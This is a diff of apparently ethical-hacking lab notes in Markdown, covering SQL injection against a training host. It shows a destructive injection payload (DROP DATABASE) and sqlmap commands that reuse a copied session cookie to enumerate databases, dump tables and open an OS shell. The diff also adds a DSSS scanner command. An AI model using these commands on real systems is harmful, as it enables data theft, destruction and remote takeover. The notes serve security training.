@@ -215,22 +215,26 @@ blah'; DROP DATABASE mydatabase; --
 ##### Inspect page, in the console page, type document.cookie in the lower-left corner of the browser, and press Enter. Select the cookie value, then right-click and copy it
 #### Check databases
 ```bash
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --dbs 
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" --dbs 
 ```
 #### See tables of database
 ```bash
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D <database> --tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" -D <database> --tables
 ```
 #### Dump table from database
 ```bash
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D <database> -T <table> --dump
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" -D <database> -T <table> --dump
 ```
 #### Get shell
 ```bash
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --os-shell
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" --os-shell
 ```
-
+#### DSS
+##### Get cookie just like SQLmap
+python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>"
 dsss.py
+ 
+#### Use ZAP Automated scan to find CWE and WASC ID numbers
 
 ## Steganography
 #### Snow
